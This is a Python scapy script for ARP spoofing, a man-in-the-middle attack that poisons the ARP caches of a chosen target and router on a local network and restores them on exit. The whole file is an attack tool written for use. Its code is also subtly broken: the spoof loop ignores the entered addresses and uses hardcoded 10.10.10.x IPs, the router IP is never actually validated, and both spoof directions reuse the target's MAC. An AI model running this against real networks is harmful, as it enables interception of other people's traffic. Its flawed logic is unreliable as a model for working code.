#!/usr/bin/env python3

#Imports
import os
import sys
import netifaces as ni
import re
import scapy.all as scapy
import time

#Functions
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = target_mac_address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet,count=4 , verbose=False)

#Main
print('''
░█████╗░██████╗░██████╗░░██████╗██████╗░░█████╗░░█████╗░███████╗██████╗░██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚██╗░██╔╝
███████║██████╔╝██████╔╝╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░██████╔╝░╚████╔╝░
██╔══██║██╔══██╗██╔═══╝░░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██╔═══╝░░░╚██╔╝░░
██║░░██║██║░░██║██║░░░░░██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░██║░░░░░░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░\n''')

#Check if user is root
if not os.geteuid()==0:
    sys.exit('This script must be run as root!')
else:
    print("User is root, the script can continue...\n")

ip_pattern = re.compile("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")

#Pick a network card
cards_list = os.listdir('/sys/class/net/')
cards_list.remove('lo')
number = 0
for card in cards_list:
    number = number + 1
    print(str(number) + ". " + card)

network_card_number = input("\nPick your network card (The number beside it) > ")
# Subtract 1 as the array is based on zero index
sel_card_number = int(network_card_number) - 1

if sel_card_number >= 0 and sel_card_number < number:
    card_selected = cards_list[sel_card_number]
    print("\nYou have picked " + card_selected)
else:
    print("\nInvalid input, pick a listed network card.")
    exit(0)

ip_address_of_interface = ni.ifaddresses(card_selected)[ni.AF_INET][0]['addr']

ip_address_of_target = input("\nEnter the IP address of target > ")

if ip_pattern.search(str(ip_address_of_target)):
    print("\nIP is valid, script can continue...\n")
else:
    print("\nIP is not valid! Script will exit now...")
    exit(0)

ip_address_of_router = input("\nEnter the IP address of router > ")

if ip_pattern.search(str(ip_address_of_target)):
    print("\nIP is valid, script can continue...\n")
else:
    print("\nIP is not valid! Script will exit now...")
    exit(0)


#Get mac address
try:
    target_mac_address = get_mac(ip_address_of_target)
except IndexError:
    print("The IP address you entered is either not valid or an unknown error occoured. Exiting...")
    exit(0)

print("Spoofing...\n")

sent_packets_count = 0

try:
    while True:
        spoof("10.10.10.12", "10.10.10.2")
        spoof("10.10.10.2", "10.10.10.12")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\nRestoring ARP tables and exiting...")
    restore(ip_address_of_router, ip_address_of_target)
    restore(ip_address_of_target, ip_address_of_router)
